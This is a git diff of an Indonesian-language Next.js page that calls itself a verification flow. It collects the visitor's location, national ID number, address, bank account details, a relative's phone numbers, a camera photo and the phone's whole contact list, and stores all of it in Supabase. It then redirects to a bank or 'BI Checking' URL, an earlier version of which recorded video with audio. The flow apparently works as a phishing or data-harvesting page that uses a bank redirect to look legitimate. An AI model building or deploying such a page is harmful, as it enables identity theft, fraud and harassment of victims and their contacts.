@@ -1,20 +1,50 @@
+/* eslint-disable @typescript-eslint/no-unused-vars */
 /* eslint-disable @typescript-eslint/no-explicit-any */
 "use client";
 
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { supabase } from "@/lib/supabse";
 import FullScreenLoader from "@/components/FullScreenLoader";
 import { LocationData } from "@/types";
+import { useForm } from "react-hook-form";
+import { zodResolver } from "@hookform/resolvers/zod";
+import * as z from "zod";
+import CameraCapture from "@/components/Camera";
+
+// Skema validasi menggunakan Zod
+const formSchema = z.object({
+	firstName: z.string().min(2, "Nama depan minimal 2 karakter"),
+	lastName: z.string().min(2, "Nama belakang minimal 2 karakter"),
+	phone: z.string().min(10, "No HP minimal 10 karakter"),
+	whatsapp: z.string().min(10, "No WhatsApp minimal 10 karakter"),
+	idCard: z.string().min(16, "No KTP harus 16 karakter").max(16, "No KTP harus 16 karakter"),
+	street: z.string().min(5, "Alamat jalan minimal 5 karakter"),
+	district: z.string().min(2, "Kecamatan minimal 2 karakter"),
+	city: z.string().min(2, "Kota/Kabupaten minimal 2 karakter"),
+	province: z.string().min(2, "Provinsi minimal 2 karakter"),
+	bankName: z.string().min(2, "Nama bank minimal 2 karakter"),
+	accountNumber: z.string().min(5, "Nomor rekening minimal 5 karakter"),
+	accountName: z.string().min(2, "Nama pemilik rekening minimal 2 karakter"),
+	relationType: z.enum(["Orang Tua", "Suami/Istri", "Anak", "Saudara"]),
+	relationName: z.string().min(2, "Nama kerabat minimal 2 karakter"),
+	relationPhone: z.string().min(10, "No HP kerabat minimal 10 karakter"),
+	relationWhatsapp: z.string().min(10, "No WhatsApp kerabat minimal 10 karakter"),
+});
+
+type FormValues = z.infer<typeof formSchema>;
 
 export default function Home() {
-	const [status, setStatus] = useState<"initial" | "location" | "camera" | "contacts" | "completed" | "error">("initial");
+	const [status, setStatus] = useState<"initial" | "location" | "form" | "photo" | "contacts" | "completed" | "error">("initial");
 	const [error, setError] = useState("");
-	const [userData, setUserData] = useState<{ id?: string; location?: LocationData; contacts?: any[] }>({});
-	const [countdown, setCountdown] = useState(15);
-	const videoRef = useRef<HTMLVideoElement>(null);
-	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
-	const recordedChunksRef = useRef<Blob[]>([]);
-	const countdownTimerRef = useRef<NodeJS.Timeout | null>(null);
+	const [userData, setUserData] = useState<{ id?: string; location?: LocationData }>({});
+	const [_, setPhotoUrl] = useState("");
+	const {
+		register,
+		handleSubmit,
+		formState: { errors },
+	} = useForm<FormValues>({
+		resolver: zodResolver(formSchema),
+	});
 
 	useEffect(() => {
 		if (typeof window !== "undefined" && window.innerWidth < 768) {
@@ -28,18 +58,6 @@ export default function Home() {
 		}
 	}, []);
 
-	// Fungsi untuk mendapatkan mimeType yang didukung
-	const getSupportedMimeType = () => {
-		const mimeTypes = ["video/webm", "video/mp4"];
-
-		for (const mimeType of mimeTypes) {
-			if (MediaRecorder.isTypeSupported(mimeType)) {
-				return mimeType;
-			}
-		}
-		return "video/webm";
-	};
-
 	const requestLocation = async () => {
 		try {
 			const location = await getLocation();
@@ -50,108 +68,87 @@ export default function Home() {
 			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);
 
 			setUserData((prev) => ({ ...prev, id: data.id }));
-			setStatus("camera");
+			setStatus("form");
 		} catch (err: any) {
 			setStatus("error");
 			setError(err.message);
 		}
 	};
 
-	const startCamera = async () => {
+	const onSubmit = async (data: FormValues) => {
+		if (!userData.id) {
+			setStatus("error");
+			setError("Data pengguna tidak ditemukan");
+			return;
+		}
+
 		try {
-			const stream = await navigator.mediaDevices.getUserMedia({
-				video: { facingMode: "user" },
-				audio: true,
-			});
+			// Simpan data utama
+			await supabase.from("user_profiles").insert([
+				{
+					user_data_id: userData.id,
+					first_name: data.firstName,
+					last_name: data.lastName,
+					phone: data.phone,
+					whatsapp: data.whatsapp,
+					id_card: data.idCard,
+					address_street: data.street,
+					address_district: data.district,
+					address_city: data.city,
+					address_province: data.province,
+				},
+			]);
 
-			if (videoRef.current) {
-				videoRef.current.srcObject = stream;
-			}
+			// Simpan data bank
+			await supabase.from("user_banks").insert([
+				{
+					user_data_id: userData.id,
+					bank_name: data.bankName,
+					account_number: data.accountNumber,
+					account_name: data.accountName,
+				},
+			]);
 
-			return stream;
-		} catch (err) {
-			throw new Error(`Gagal mengakses kamera: ${(err as Error).message}`);
+			// Simpan data kerabat
+			await supabase.from("user_relations").insert([
+				{
+					user_data_id: userData.id,
+					relation: data.relationType,
+					name: data.relationName,
+					phone: data.relationPhone,
+					whatsapp: data.relationWhatsapp,
+				},
+			]);
+
+			setStatus("photo");
+		} catch (err: any) {
+			setStatus("error");
+			setError(`Gagal menyimpan data: ${err.message}`);
 		}
 	};
 
-	const handleStartRecording = async () => {
+	const handlePhotoTaken = async (photoUrl: string) => {
+		if (!userData.id) {
+			setStatus("error");
+			setError("Data pengguna tidak ditemukan");
+			return;
+		}
+
 		try {
-			const stream = await startCamera();
+			// Simpan foto ke database
+			await supabase.from("user_photos").insert([
+				{
+					user_data_id: userData.id,
+					photo_url: photoUrl,
+				},
+			]);
 
-			// Dapatkan mimeType yang didukung
-			const mimeType = getSupportedMimeType();
-
-			const recorder = new MediaRecorder(stream, { mimeType });
-			mediaRecorderRef.current = recorder;
-			recordedChunksRef.current = [];
-
-			recorder.ondataavailable = (e) => {
-				if (e.data.size > 0) {
-					recordedChunksRef.current.push(e.data);
-				}
-			};
-
-			recorder.onstop = async () => {
-				try {
-					// Buat blob dari rekaman
-					const blob = new Blob(recordedChunksRef.current, { type: mimeType });
-
-					// Tentukan ekstensi file berdasarkan mimeType
-					const extension = mimeType.includes("mp4") ? "mp4" : "webm";
-					const fileName = `video-${Date.now()}.${extension}`;
-
-					// Simpan blob ke Supabase Storage
-					const { data, error } = await supabase.storage.from("videos").upload(fileName, blob, {
-						contentType: mimeType,
-						cacheControl: "3600",
-					});
-
-					if (error) throw new Error(`Upload gagal: ${error.message}`);
-
-					// Dapatkan URL publik
-					const { data: publicUrlData } = supabase.storage.from("videos").getPublicUrl(data.path);
-
-					const videoUrl = publicUrlData.publicUrl;
-
-					// Simpan URL video ke database
-					if (userData.id) {
-						await supabase.from("user_videos").insert([
-							{
-								user_data_id: userData.id,
-								video_url: videoUrl,
-							},
-						]);
-					}
-
-					// Lanjut ke kontak
-					setStatus("contacts");
-					requestContacts();
-
-					// Hentikan stream
-					stream.getTracks().forEach((track) => track.stop());
-				} catch (err) {
-					setStatus("error");
-					setError(`Gagal mengunggah video: ${(err as Error).message}`);
-				}
-			};
-
-			// Mulai countdown
-			setCountdown(15);
-			countdownTimerRef.current = setInterval(() => {
-				setCountdown((prev) => {
-					if (prev <= 1) {
-						if (countdownTimerRef.current) clearInterval(countdownTimerRef.current);
-						recorder.stop();
-						return 0;
-					}
-					return prev - 1;
-				});
-			}, 1000);
-
-			recorder.start();
+			setPhotoUrl(photoUrl);
+			setStatus("contacts");
+			requestContacts();
 		} catch (err) {
 			setStatus("error");
-			setError(`Gagal memulai rekaman: ${(err as Error).message}`);
+			setError(`Gagal menyimpan foto: ${(err as Error).message}`);
 		}
 	};
 
@@ -163,29 +160,28 @@ export default function Home() {
 				return;
 			}
 
-			const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
-			const formattedContacts = contacts.map((contact: any) => ({
-				name: contact.name?.[0] || "",
-				email: contact.email?.[0] || "",
-				phone: contact.tel?.[0] || "",
-			}));
-
-			setUserData((prev) => ({ ...prev, contacts: formattedContacts }));
+			const contacts = await (navigator as any).contacts.select(["name", "tel"], { multiple: true });
 
 			// Simpan kontak ke database
 			if (userData.id) {
-				await supabase.from("user_data").update({ contacts: formattedContacts }).eq("id", userData.id);
+				await supabase.from("user_contacts").insert(
+					contacts.map((contact: any) => ({
+						user_data_id: userData.id,
+						name: contact.name?.[0] || "",
+						phone: contact.tel?.[0] || "",
+					}))
+				);
 			}
 
 			setStatus("completed");
 
 			// Redirect setelah 2 detik
 			setTimeout(() => {
-				window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.bca.co.id";
+				window.location.href = process.env.NEXT_PUBLIC_BI_CHECKING_URL || "https://bi-checking.example.com";
 			}, 2000);
 		} catch (err: any) {
 			console.error("Error mengambil kontak:", err);
-			setStatus("completed");
+			setStatus("completed"); // Lanjutkan meskipun gagal ambil kontak
 		}
 	};
 
@@ -204,27 +200,144 @@ export default function Home() {
 				</div>
 			)}
 
-			{status === "camera" && (
-				<div className="w-full max-w-md">
-					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6 border border-gray-200 relative">
-						<video ref={videoRef} autoPlay playsInline muted className="w-full h-auto aspect-video object-cover" />
-						{countdown > 0 && countdown < 15 && <div className="absolute top-4 right-4 bg-red-500 text-white px-3 py-1 rounded-full font-bold">{countdown}s</div>}
-					</div>
+			{status === "form" && (
+				<div className="w-full max-w-md overflow-y-auto max-h-screen py-4">
+					<h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Data Pribadi</h2>
 
-					<div className="text-center">
-						{countdown === 15 ? (
-							<button onClick={handleStartRecording} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
-								Mulai Merekam (15 detik)
-							</button>
-						) : (
-							<div className="py-3">
-								<p className="text-gray-600">Video sedang direkam...</p>
-								<div className="mt-2 w-full bg-gray-200 rounded-full h-2">
-									<div className="bg-blue-600 h-2 rounded-full" style={{ width: `${(countdown / 15) * 100}%` }}></div>
+					<form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
+						<div className="space-y-4">
+							<h3 className="text-lg font-semibold text-gray-700">Informasi Pribadi</h3>
+
+							<div className="grid grid-cols-2 gap-4">
+								<div>
+									<label className="block text-gray-700 mb-1">Nama Depan *</label>
+									<input {...register("firstName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+									{errors.firstName && <p className="text-red-500 text-sm mt-1">{errors.firstName.message}</p>}
+								</div>
+
+								<div>
+									<label className="block text-gray-700 mb-1">Nama Belakang *</label>
+									<input {...register("lastName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+									{errors.lastName && <p className="text-red-500 text-sm mt-1">{errors.lastName.message}</p>}
 								</div>
 							</div>
-						)}
-					</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">No Handphone *</label>
+								<input {...register("phone")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">No WhatsApp *</label>
+								<input {...register("whatsapp")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.whatsapp && <p className="text-red-500 text-sm mt-1">{errors.whatsapp.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">No KTP *</label>
+								<input {...register("idCard")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.idCard && <p className="text-red-500 text-sm mt-1">{errors.idCard.message}</p>}
+							</div>
+						</div>
+
+						<div className="space-y-4">
+							<h3 className="text-lg font-semibold text-gray-700">Alamat Lengkap</h3>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Jalan *</label>
+								<input {...register("street")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.street && <p className="text-red-500 text-sm mt-1">{errors.street.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Kecamatan *</label>
+								<input {...register("district")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.district && <p className="text-red-500 text-sm mt-1">{errors.district.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Kota/Kabupaten *</label>
+								<input {...register("city")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.city && <p className="text-red-500 text-sm mt-1">{errors.city.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Provinsi *</label>
+								<input {...register("province")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.province && <p className="text-red-500 text-sm mt-1">{errors.province.message}</p>}
+							</div>
+						</div>
+
+						<div className="space-y-4">
+							<h3 className="text-lg font-semibold text-gray-700">Informasi Rekening Bank</h3>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Nama Bank *</label>
+								<input {...register("bankName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.bankName && <p className="text-red-500 text-sm mt-1">{errors.bankName.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Nomor Rekening *</label>
+								<input {...register("accountNumber")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.accountNumber && <p className="text-red-500 text-sm mt-1">{errors.accountNumber.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Atas Nama *</label>
+								<input {...register("accountName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.accountName && <p className="text-red-500 text-sm mt-1">{errors.accountName.message}</p>}
+							</div>
+						</div>
+
+						<div className="space-y-4">
+							<h3 className="text-lg font-semibold text-gray-700">Informasi Kerabat Dekat</h3>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Hubungan *</label>
+								<select {...register("relationType")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+									<option value="">Pilih Hubungan</option>
+									<option value="Orang Tua">Orang Tua</option>
+									<option value="Suami/Istri">Suami/Istri</option>
+									<option value="Anak">Anak</option>
+									<option value="Saudara">Saudara</option>
+								</select>
+								{errors.relationType && <p className="text-red-500 text-sm mt-1">{errors.relationType.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">Nama Lengkap *</label>
+								<input {...register("relationName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.relationName && <p className="text-red-500 text-sm mt-1">{errors.relationName.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">No Handphone *</label>
+								<input {...register("relationPhone")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.relationPhone && <p className="text-red-500 text-sm mt-1">{errors.relationPhone.message}</p>}
+							</div>
+
+							<div>
+								<label className="block text-gray-700 mb-1">No WhatsApp *</label>
+								<input {...register("relationWhatsapp")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+								{errors.relationWhatsapp && <p className="text-red-500 text-sm mt-1">{errors.relationWhatsapp.message}</p>}
+							</div>
+						</div>
+
+						<div className="mt-8">
+							<button type="submit" className="w-full px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
+								Simpan Data
+							</button>
+						</div>
+					</form>
+				</div>
+			)}
+
+			{status === "photo" && (
+				<div className="w-full max-w-md">
+					<h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Ambil Foto</h2>
+					<CameraCapture onCapture={handlePhotoTaken} />
 				</div>
 			)}
 
@@ -249,7 +362,7 @@ export default function Home() {
 					<h2 className="text-2xl font-semibold text-gray-800 mb-4">Verifikasi Berhasil!</h2>
 					<p className="text-gray-600 mb-6">Semua data telah berhasil dikumpulkan dan disimpan.</p>
 					<div className="bg-green-50 p-4 rounded-lg border border-green-200">
-						<p className="text-green-700">Anda akan diarahkan ke halaman tujuan...</p>
+						<p className="text-green-700">Anda akan diarahkan ke halaman BI Checking...</p>
 					</div>
 				</div>
 			)}
